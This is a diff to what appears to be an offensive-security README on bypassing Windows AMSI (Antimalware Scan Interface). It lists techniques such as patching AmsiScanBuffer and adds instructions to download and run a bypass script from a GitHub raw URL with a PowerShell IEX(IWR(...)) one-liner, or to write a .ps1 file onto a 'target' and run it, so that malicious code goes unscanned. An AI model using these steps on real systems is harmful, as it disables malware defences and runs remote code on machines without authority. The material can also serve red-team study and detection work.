@@ -24,3 +24,12 @@ Make sure to use the obfuscated verison of the AMSI bypass, since we need to tri
 21. Adam Chesters Patch
 22. Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation
 23. Patching the AmsiScanBuffer address in System.Management.Automation.dll
+
+
+(not stealthy since network calls will get logged)
+The scripts can either be run in powershell by fetching them from github and then executing them like so: 
+`IEX(IWR("https://raw.githubusercontent.com/Rasmus3650/WindowsHacking/Main/AMSI/scripts/in_memory_patching/amsibp_working.ps1"))`
+
+We can also create a new .ps1 file on the target and then executing this file with `./target_file.ps1` in powershell.
+
+The powershell instance should now work without ever asking AMSI whether or not the code we are running is malicious 
